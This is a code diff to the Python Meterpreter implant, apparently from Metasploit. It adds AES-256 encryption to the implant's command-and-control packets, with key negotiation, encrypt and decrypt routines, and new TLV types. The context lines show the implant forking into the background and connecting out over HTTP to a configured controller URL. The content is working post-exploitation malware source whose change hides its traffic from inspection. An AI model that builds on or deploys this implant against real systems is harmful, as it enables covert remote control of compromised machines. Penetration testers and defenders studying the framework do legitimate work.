@@ -164,16 +164,24 @@ TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
 TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
 TLV_TYPE_SESSION_GUID          = TLV_META_TYPE_RAW     | 462
 
+TLV_TYPE_RSA_PUB_KEY           = TLV_META_TYPE_STRING  | 550
+TLV_TYPE_SYM_KEY_TYPE          = TLV_META_TYPE_UINT    | 551
+TLV_TYPE_SYM_KEY               = TLV_META_TYPE_RAW     | 552
+TLV_TYPE_ENC_SYM_KEY           = TLV_META_TYPE_RAW     | 553
+
 TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
 TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
 TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
 TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
 
+
 EXPORTED_SYMBOLS = {}
 EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING
 
-# Packet header sizes
 ENC_NONE = 0
+ENC_AES256 = 1
+
+# Packet header sizes
 PACKET_XOR_KEY_SIZE = 4
 PACKET_SESSION_GUID_SIZE = 16
 PACKET_ENCRYPT_FLAG_SIZE = 4
@@ -196,6 +204,9 @@ class SYSTEM_INFO(ctypes.Structure):
         ("dwAllocationGranularity", ctypes.c_uint32),
         ("wProcessorLevel", ctypes.c_uint16),
         ("wProcessorRevision", ctypes.c_uint16)]
+
+def rand_bytes(n):
+    return os.urandom(n)
 
 def rand_xor_key():
     return tuple(random.randint(1, 255) for _ in range(4))
@@ -624,6 +635,8 @@ class Transport(object):
         self.retry_total = SESSION_RETRY_TOTAL
         self.retry_wait = SESSION_RETRY_WAIT
         self.request_retire = False
+        self.aes_enabled = False
+        self.aes_key = None
 
     def __repr__(self):
         return "<{0} url='{1}' >".format(self.__class__.__name__, self.url)
@@ -665,6 +678,8 @@ class Transport(object):
         return True
 
     def activate(self):
+        self.aes_key = None
+        self.aes_enabled = False
         end_time = time.time() + self.retry_total
         while time.time() < end_time:
             try:
@@ -690,11 +705,16 @@ class Transport(object):
 
     def decrypt_packet(self, pkt):
         if pkt and len(pkt) > PACKET_HEADER_SIZE:
-            # We don't support AES encryption yet, so just do the normal
-            # XOR thing and move on
             xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE])
             raw = xor_bytes(xor_key, pkt)
-            return raw[PACKET_HEADER_SIZE:]
+            enc_offset = PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE
+            enc_flag = struct.unpack('>I', raw[enc_offset:enc_offset+PACKET_ENCRYPT_FLAG_SIZE])[0]
+            if enc_flag == ENC_AES256:
+                iv = raw[PACKET_HEADER_SIZE:PACKET_HEADER_SIZE+16]
+                encrypted = raw[PACKET_HEADER_SIZE+len(iv):]
+                return met_aes_decrypt(self.aes_key, iv, encrypted)
+            else:
+                return raw[PACKET_HEADER_SIZE:]
         return None
 
     def get_packet(self):
@@ -713,9 +733,21 @@ class Transport(object):
         # The packet now has to contain session GUID and encryption flag info
         # And given that we're not yet supporting AES, we're going to just
         # always return the session guid and the encryption flag set to 0
-        # TODO: we'll add encryption soon!
+        enc_type = ENC_NONE
+        if self.aes_key:
+            # We've got a key, but only encrypt if it's enabled
+            if self.aes_enabled:
+                iv = rand_bytes(16)
+                enc = iv + met_aes_encrypt(self.aes_key, iv, pkt[8:])
+                hdr = struct.pack('>I', len(enc) + 8) + pkt[4:8]
+                pkt = hdr + enc
+                enc_type = ENC_AES256
+            else:
+                # We enable it here.
+                self.aes_enabled = True
+
         xor_key = rand_xor_key()
-        raw = binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8')) + struct.pack('>I', ENC_NONE) + pkt
+        raw = binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8')) + struct.pack('>I', enc_type) + pkt
         result = struct.pack('BBBB', *xor_key) + xor_bytes(xor_key, raw)
         return result
 
@@ -1181,6 +1213,16 @@ class PythonMeterpreter(object):
             return ERROR_FAILURE, response
         return ERROR_SUCCESS, response
 
+    def _core_negotiate_tlv_encryption(self, request, response):
+        debug_print('[*] Negotiating TLV encryption')
+        self.transport.aes_key = rand_bytes(32)
+        self.transport.aes_enabled = False
+        response += tlv_pack(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256)
+        # TODO: handle the RSA stuff
+        response += tlv_pack(TLV_TYPE_SYM_KEY, self.transport.aes_key)
+        debug_print('[*] TLV encryption sorted')
+        return ERROR_SUCCESS, response
+
     def _core_loadlib(self, request, response):
         data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
         if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
@@ -1386,6 +1428,8 @@ class PythonMeterpreter(object):
         response += tlv_pack(reqid_tlv)
         return response + tlv_pack(TLV_TYPE_RESULT, result)
 
+# PATCH-SETUP-ENCRYPTION #
+
 _try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
 if not _try_to_fork or (_try_to_fork and os.fork() == 0):
     if hasattr(os, 'setsid'):
@@ -1393,6 +1437,7 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
             os.setsid()
         except OSError:
             pass
+
     if HTTP_CONNECTION_URL and has_urllib:
         transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                 http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
